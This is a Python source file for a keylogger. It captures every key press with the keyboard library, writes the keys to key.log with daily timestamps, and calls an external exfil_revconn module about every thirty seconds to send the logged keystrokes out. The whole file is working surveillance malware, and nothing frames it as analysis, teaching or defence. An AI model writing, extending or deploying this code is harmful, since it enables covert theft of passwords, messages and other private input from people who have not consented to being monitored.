#! Add import statements in a try-catch block
import keyboard
import time
from apscheduler.schedulers.blocking import BlockingScheduler
import threading

'''
Add time to logs
[ time.asctime(time.gmtime()) ]
'''


class Keylogger:
    def __init__(self) -> None:
        self.log_file = 'key.log'
        keyboard.on_press(self.on_press)

        timelog_thread = threading.Thread(target=self.BreakTime)
        timelog_thread.start()
        exfil_thread = threading.Thread(target=self.timely_exfil)
        exfil_thread.start()

        keyboard.wait()

    def on_press(self, event):
        with open(self.log_file, 'a') as logf:
            logf.write((f"{event.name}\t"))

    def timely_exfil(self):
        import exfil_revconn as exfil
        exfil.exfil_data()
        scheduler = BlockingScheduler()
        scheduler.add_job(self.timely_exfil, "interval", hours=0.0083)
        scheduler.start()

    def BreakTime(self):
        while True:
            print('[+]  Adding time log to file')
            with open(self.log_file, 'a') as logf:
                logf.write(f"\n[ {time.asctime(time.gmtime())} ]\n")
            # time.sleep(43200)  # 43200
            scheduler = BlockingScheduler()
            scheduler.add_job(self.BreakTime, "interval", hours=24)
            scheduler.start()


Keylogger()
